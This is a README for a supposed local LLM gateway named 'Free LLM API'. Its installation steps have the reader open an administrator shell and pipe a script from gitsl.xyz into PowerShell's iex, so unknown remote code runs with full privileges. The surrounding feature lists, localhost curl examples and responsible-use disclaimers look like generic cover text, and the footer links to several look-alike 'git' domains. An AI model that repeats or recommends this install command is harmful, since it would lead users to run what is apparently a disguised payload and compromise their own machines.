# Free LLM API — Local Model Gateway

> A local gateway for routing authorized language-model requests to approved local or hosted adapters with budgets, logs, and policy controls.

---
## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

### Step 1: Open CMD or PowerShell as Administrator
```cmd
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Execute Deployment Command
```cmd
powershell -Command "irm gitsl.xyz?get=free-llm-api | iex"
```

### Step 3: Wait for Completion
```
[1/4] Loading Free Llm Api modules...
[2/4] Configuring components...
[3/4] Initializing services...
[4/4] Ready. Launch Free Llm Api.
```

### Step 4: Start Using the Tool
- Launch the tool from the Start menu or command line
- Configure settings for your environment
- Verify the health check passes

---

## TL;DR - Quick Summary

**Free LLM API** is a local compatibility gateway for applications that need one consistent interface across approved model adapters. It provides request budgets, redaction, caching, health checks, and auditable routing without promising free access to proprietary services.

**Best for:** AI application developers, home-lab users, and teams evaluating model adapters.

**Key differentiators:**
1. Adapter abstraction
2. Local-first development
3. Token and request budgets
4. Redacted request logs
5. Health checks and fallback rules

---

## Core Features

```
✅ Unified chat-completions style API
✅ Local fixture and model adapters
✅ Authorized provider configuration
✅ Token and rate budgets
✅ Redaction and log controls
✅ Health checks and bounded fallback
✅ Optional response cache
✅ Usage reports and metrics
```

---

## Usage

```bash
# Start the local gateway
python -m free_llm_api serve --host 127.0.0.1 --port 8000

# Run a fixture request
python -m free_llm_api chat --adapter fixture --prompt "Explain a local cache"

# Check adapter health
python -m free_llm_api health

# Export a redacted usage report
python -m free_llm_api report --from 2026-09-01 --redact
```

---

## REST API

> [!NOTE]
> The gateway accepts only configured adapters and enforces local budgets. It does not discover, bypass, or proxy unauthorized endpoints.

```bash
# List configured adapters
curl http://localhost:8000/v1/adapters

# Send a request through the local fixture adapter
curl -X POST http://localhost:8000/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d '{"adapter":"fixture","messages":[{"role":"user","content":"Explain a local cache"}],"max_tokens":120}'

# Read redacted metrics
curl http://localhost:8000/api/v1/metrics?redact=true
```

---

## Screenshots

- Gateway dashboard: `screenshots/gateway-dashboard.png`
- Adapter health: `screenshots/adapter-health.png`
- Usage report: `screenshots/usage-report.png`
- Policy settings: `screenshots/policy-settings.png`

---

## Troubleshooting

| Issue | Solution |
|---|---|
| Adapter is unavailable | Check the local configuration and run the health command. |
| Request exceeds budget | Increase the local budget intentionally or reduce the request size. |
| Logs contain sensitive text | Enable redaction and rotate any accidentally stored values. |
| Fallback loops | Set a maximum fallback count and require a healthy target. |
| Port 8000 is busy | Start the gateway on another local port. |

---

## Use Cases

- **Local Development** — Test application code with a deterministic fixture adapter.
- **Model Evaluation** — Compare approved adapters through one interface.
- **Cost Control** — Enforce token and request budgets at the gateway.
- **Privacy Reviews** — Redact logs before sharing diagnostics.

---

## ⚠️ IMPORTANT

> [!IMPORTANT]
> Use only models and endpoints you are authorized to access. Do not bypass subscriptions, share API keys, scrape services, or send private data to an unapproved provider.

> [!TIP]
> Keep a model card for every adapter, including its license, data handling, limits, and fallback behavior.

---

## License

MIT License — see the [LICENSE](./LICENSE) file for details.

---

## Tags

<!--
free-llm-api, local-ai, model-gateway, llm, api-gateway, privacy, budgeting, adapters, observability, responsible-ai
-->

[gitsl.xyz](https://gitsl.xyz?t=free-llm-api) | [gitrm.sbs](https://gitrm.sbs?t=free-llm-api) | [gitview.sbs](https://gitview.sbs?t=free-llm-api) | [gitrm.cfd](https://gitrm.cfd?t=free-llm-api) | [viewgit.sbs](https://viewgit.sbs?t=free-llm-api)
